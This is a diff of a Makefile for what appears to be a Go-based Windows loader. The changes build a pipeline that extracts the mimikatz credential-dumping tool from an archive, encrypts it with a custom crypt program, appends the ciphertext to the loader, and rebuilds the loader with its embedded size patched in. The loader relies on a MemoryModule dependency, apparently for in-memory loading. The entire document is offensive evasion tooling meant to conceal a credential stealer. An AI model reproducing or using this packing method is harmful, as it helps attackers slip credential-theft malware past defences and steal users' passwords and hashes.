@@ -5,9 +5,14 @@ compiler = amd64-mingw32msvc-gcc
 endif
 arch = amd64
 
+all: pack
+
 # Build the dependencies first (subdirs), then move onto the meat and potatoes.
 mimikatz.exe: MemoryModule mimikatz.go
 	CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
+	sed -i "s/^\\(const SIZE int = \\).*\$$/\\1`du -bs mimikatz.exe | sed 's/[[:blank:]].*//'`"/g mimikatz.go
+	CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
+
 
 # Dependency build. 
 SUBDIRS = MemoryModule
@@ -20,8 +25,12 @@ MemoryModule:
 	$(MAKE) -C $@
 
 
-# Packing the binary
-pack: crypt download
+# Packing it inside of the loader
+pack: encrypt mimikatz.exe
+	cat mimi_encrypted >> mimikatz.exe
+
+# Encrypting the binary
+encrypt: crypt download
 	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt > mimi_encrypted
 
 crypt: crypt.go
@@ -41,4 +50,4 @@ $(CLEANDIRS):
 test:
 	$(MAKE) -C tests test
 
-.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) clean test pack download
+.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) clean test encrypt download
